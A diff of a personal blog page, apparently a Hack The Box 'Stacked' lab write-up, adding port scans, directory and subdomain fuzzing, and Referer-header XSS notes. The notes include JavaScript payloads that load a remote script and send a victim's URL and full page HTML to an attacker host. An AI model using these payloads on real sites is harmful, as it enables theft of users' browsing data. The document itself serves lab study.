@@ -45,8 +45,8 @@
 <meta property="og:title" content="htb stacked" />
 <meta name="author" content="Yuchao" />
 <meta property="og:locale" content="en" />
-<meta name="description" content="recon 1 2 nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.112 nmap -p 22,80,2376 -sCV -oA scans/nmap-tcpscripts 10.10.11.112" />
-<meta property="og:description" content="recon 1 2 nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.112 nmap -p 22,80,2376 -sCV -oA scans/nmap-tcpscripts 10.10.11.112" />
+<meta name="description" content="recon" />
+<meta property="og:description" content="recon" />
 <link rel="canonical" href="/posts/htb-stacked/" />
 <meta property="og:url" content="/posts/htb-stacked/" />
 <meta property="og:site_name" content="Yuchao Toolbox" />
@@ -57,7 +57,7 @@
 <meta name="twitter:site" content="@0xZEN2" />
 <meta name="twitter:creator" content="@Yuchao" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yuchao"},"dateModified":"2022-03-29T11:33:00+08:00","datePublished":"2022-03-29T11:33:00+08:00","description":"recon 1 2 nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.112 nmap -p 22,80,2376 -sCV -oA scans/nmap-tcpscripts 10.10.11.112","headline":"htb stacked","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/htb-stacked/"},"url":"/posts/htb-stacked/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yuchao"},"dateModified":"2022-03-30T22:39:58+08:00","datePublished":"2022-03-29T11:33:00+08:00","description":"recon","headline":"htb stacked","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/htb-stacked/"},"url":"/posts/htb-stacked/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
@@ -546,6 +546,30 @@
       
 
     
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
 
     
 
@@ -558,6 +582,89 @@
 
   
   
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+
+    
 
   
 
@@ -627,6 +734,24 @@
 
       <!-- lastmod date -->
       
+      <span>
+        Updated
+        <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/timeago.js
+-->
+
+<em class="timeago"
+    data-ts="1648651198"
+    
+      data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll"
+    
+    >
+  2022-03-30
+</em>
+
+      </span>
+      
 
       <!-- read time -->
       <!--
@@ -648,7 +773,7 @@
 
 <!-- return element -->
 <span class="readtime" data-toggle="tooltip" data-placement="bottom"
-  title="17 words">
+  title="241 words">
   <em>1 min</em> read</span>
 
 
@@ -662,6 +787,8 @@
 
 <div class="post-content">
   <h2 id="recon"><span class="mr-2">recon</span><a href="#recon" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
+
+<h4 id="nmap"><span class="mr-2">nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
         <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
@@ -669,6 +796,88 @@
 </pre></td><td class="rouge-code"><pre>nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.112
 nmap -p 22,80,2376 -sCV -oA scans/nmap-tcpscripts 10.10.11.112
 </pre></td></tr></tbody></table></code></div></div>
+<ul>
+  <li>22/tcp   open  ssh; 80/tcp   open  http; 2376/tcp open  docker</li>
+</ul>
+
+<h4 id="feroxbuster-directory-discovery"><span class="mr-2">feroxbuster, directory discovery</span><a href="#feroxbuster-directory-discovery" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<p><code class="language-plaintext highlighter-rouge">feroxbuster -u http://stacked.htb</code></p>
+
+<h4 id="wfuzz-host-discovery"><span class="mr-2">wfuzz, host discovery</span><a href="#wfuzz-host-discovery" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<p><code class="language-plaintext highlighter-rouge">wfuzz -H "Host: FUZZ.stacked.htb" -u http://stacked.htb -w /usr/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 26</code></p>
+<ul>
+  <li>hide word length 26 responses</li>
+  <li>find host: portfolio.stacked.htb - TCP 80</li>
+  <li>a local stack development page.</li>
+  <li><a href="https://github.com/localstack/localstack">https://github.com/localstack/localstack</a></li>
+  <li>serverless: run services often used for Serverless apps (iam, lambda, dynamodb, apigateway, s3, sns)</li>
+</ul>
+
+<h2 id="xss"><span class="mr-2">XSS</span><a href="#xss" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
+
+<h4 id="recon-for-xss"><span class="mr-2">recon for XSS</span><a href="#recon-for-xss" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<ul>
+  <li>input area, and interesting headers.</li>
+  <li>add payload as <code class="language-plaintext highlighter-rouge">&lt;img src="http://{attackerIP}/fieldname_or_header_name"&gt;</code> in different places.</li>
+  <li>send the request.
+attacker machine
+<code class="language-plaintext highlighter-rouge">sudo python3 -m http.server 80</code></li>
+  <li>80 as we did not specify port in set payload</li>
+  <li>wait a while</li>
+  <li><code class="language-plaintext highlighter-rouge">"GET /referer HTTP/1.1" 404 -</code></li>
+  <li>so the ONLY field vulnerable to XSS is: Header -&gt; referer.</li>
+  <li>
+    <ul>
+      <li>run <code class="language-plaintext highlighter-rouge">date</code> two times, culculate the XSS victim(background cron) activity interval.</li>
+    </ul>
+  </li>
+  <li>interesting material below.</li>
+  <li><a href="https://www.horizon3.ai/unauthenticated-xss-to-remote-code-execution-chain-in-mautic-3-2-4/">https://www.horizon3.ai/unauthenticated-xss-to-remote-code-execution-chain-in-mautic-3-2-4/</a></li>
+</ul>
+
+<h4 id="find-out-what-the-url-the-victim-is-looking-at"><span class="mr-2">find out what the URL the victim is looking at.</span><a href="#find-out-what-the-url-the-victim-is-looking-at" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+
+<p>Method 1:</p>
+<div class="language-javascript highlighter-rouge"><div class="code-header">
+        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://10.10.14.6/xss.js</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/script&gt;</span><span class="err"> 
+</span></pre></td></tr></tbody></table></code></div></div>
+<ul>
+  <li>in the victim`s referer, we can see the response is from: “/read-mail.php?id=5”</li>
+</ul>
+
+<p>Method 2(Better):</p>
+<div class="language-javascript highlighter-rouge"><div class="code-header">
+        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">exfilreq</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>    
+<span class="nx">exfilreq</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://{attackerIP}/</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>    
+<span class="nx">exfilreq</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span> 
+</pre></td></tr></tbody></table></code></div></div>
+<ul>
+  <li>set above script as payload</li>
+  <li>when we nc at 80, can see the victim`s current page appended.</li>
+  <li>“GET /http://mail.stacked.htb/read-mail.php?id=2 HTTP/1.1”</li>
+  <li>For victim will visit “http://{attackerIP}/http://mail.stacked.htb/read-mail.php?id=2”</li>
+</ul>
+
+<p>We can even see content the victim is browsing by</p>
+<div class="language-javascript highlighter-rouge"><div class="code-header">
+        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">exfilreq</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>    
+<span class="nx">exfilreq</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://{attackerIP}:9001/</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>    
+<span class="nx">exfilreq</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">documentElement</span><span class="p">.</span><span class="nx">outerHTML</span><span class="p">);</span> 
+</pre></td></tr></tbody></table></code></div></div>
+
+<h2 id="localstack-vulnerability"><span class="mr-2">LocalStack vulnerability</span><a href="#localstack-vulnerability" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
+
+<h4 id="cve-2021-32090"><span class="mr-2">CVE-2021-32090</span><a href="#cve-2021-32090" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
 
 </div>
 
@@ -793,6 +1002,11 @@ nmap -p 22,80,2376 -sCV -oA scans/nmap-tcpscripts 10.10.11.112
   <div id="access-lastmod" class="post">
     <div class="panel-heading">Recently Updated</div>
     <ul class="post-content pl-0 pb-1 ml-1 mt-2">
+      
+        
+        
+        
+      <li><a href="/posts/htb-stacked/">htb stacked</a></li>
       
         
         
